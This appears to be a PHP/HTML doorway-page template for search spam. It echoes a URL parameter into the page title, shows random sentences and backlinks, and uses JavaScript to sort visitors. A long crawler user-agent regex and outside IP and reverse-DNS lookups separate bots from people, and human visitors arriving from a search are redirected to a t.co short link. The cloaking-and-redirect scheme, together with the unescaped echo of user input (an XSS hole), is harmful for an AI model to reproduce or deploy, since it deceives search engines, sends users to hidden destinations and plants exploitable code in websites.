<?php
$url = $_GET['url']; // GET parametresini al

if ($url) {
    $title = ucfirst($url); // URL'den gelen veriyi büyük harf yapabilirsiniz
    $title = str_replace("-", " ", $title); // Başlıkta "-" işaretlerini boşluk ile değiştir
} else {
    $title = "Başlık Yok"; // URL belirtilmediyse bir varsayılan başlık belirleyin
}

// Read the contents of "cumleler.txt" into an array
$lines = file('cumleler.txt', FILE_IGNORE_NEW_LINES);

// Get a random line for the <h2> tag
$h2_content = $lines[array_rand($lines)];
?>



<html><head  lang="ko">
  <meta charset="utf-8">
  <meta name="language" content="ko">
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-L32EWRDNEZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-L32EWRDNEZ');
</script>

		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
function isCrawler() {
	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
	var re = new RegExp(botPattern, 'i');
	var userAgent = navigator.userAgent;
	if (re.test(userAgent)) {
		return true;
	} else {
		return false;
	}
}

function get_ip() {
	var value = $.ajax({
		url: 'https://api.seeip.org/jsonip?',
		async: false
	}).responseJSON;
	return value;
}

function gethostbyname() {
	var value = $.ajax({
		url: "https://get.geojs.io/v1/dns/ptr.json",
		async: false
	}).responseJSON;
	return value;
}

var real_ip = get_ip().ip;
var hostname = gethostbyname().ptr;


function is_google() {
	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
		return true;
	} else {
		return false;
	}
}

//search zone start//
if (is_google() == false) {
	if (document.referrer) {
		if (isCrawler() != true && is_google() != true) {
            window.location="https://t.co/Qs3vthlQTA"; 

		}
	}
}
//search zone finish//
</script>
  <title></title></head><body><sup id="mteodwntal-110787" class="nkjwhafbzt"><sup id="kkkehfktua-351479" class="msiexrryuw"><sup id="qxtjoxrpha-337093" class="kjsrhhfnr"><sup id="muiucaiugd-800871" class="fpjdyvjbj"><sup id="lmslsdgffr-53781" class="vexnplwvpk"><sup id="tsahyervq-903238" class="ngfysiorr"><sup id="jltgesnrf-197766" class="etyueqxhyw"><sup id="bphxtddpo-420037" class="kzivlwfdit"><sup id="jpcyflvdyf-57555" class="dyhkjqykx"><sup id="cmjwnpewtj-339959" class="yetoycqjo"><sup id="iueehkecsc-788339" class="cwmywddkd"><sup id="maimhxkbkk-712796" class="psbdikbpm"><sup id="mjhmdymveo-391116" class="lvwcpoivfg"><sup id="zfhwnciaqz-869107" class="gcnuglwtxe"><sup style="margin: 18px 27px 27px 25px; background: rgb(251,251,250) none repeat scroll 0%; font-size: 21px; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; line-height: 34px;" id="derskjrux" class="jmltdobzbj"><?php echo $title;?></sup></sup></sup></sup></sup></sup></sup></sup></sup></sup></sup></sup></sup></sup></sup><sup id="pcktuudcku-339209" class="lsthbljle"><sup id="khhjqorsyu-94870" class="kpygpjhfku"><sup id="hcnkikpmqm-161957" class="heicymcfqq"><sup id="tzhkoxgbv-911973" class="htqrpanip"><sup id="jhigrkpter-514441" class="funzhroqep"><sup id="vugygsqrwh-269006" class="sgddxiimd"><sup id="wlitvqndu-659253" class="pkqcnovlbq"><sup id="jybenwrjz-183710" class="gqbckdpwms"><sup id="sgdorkifxw-771447" class="vufhtmukdc"><sup id="iiucrlbhjt-168905" class="uybwtdidvo"><sup id="pgluvfinjn-538223" class="ojsdnsvjdh"><sup id="brruhvheb-489381" class="opbstatrb"><sup id="fjcmzncwy-898047" class="karlacxybk"><sup id="rvvaqvkoqy-661171" class="pvnqgxdtp"><sup style="padding: 29px 28px 26px 18px; background: rgb(252,249,251) none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; line-height: 43px; display: block; font-size: 22px;"><div><h1><?php echo $title;?></h1><p><?php include 'h2cumle.php'; ?></p><p>
  <?php
    // Read all backlinks from the "backlink.txt" file
    $backlinks = file('backlink.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

    // Select 10 random backlinks without replacement
    $randomBacklinks = array_slice($backlinks, 0, 10);

    // Display each backlink
    foreach ($randomBacklinks as $backlink) {
        echo '<p>Read more: <a href="' . $backlink . '" target="_blank">' . $backlink . '</a></p>';
    }
  ?></p>
</body>
</html>
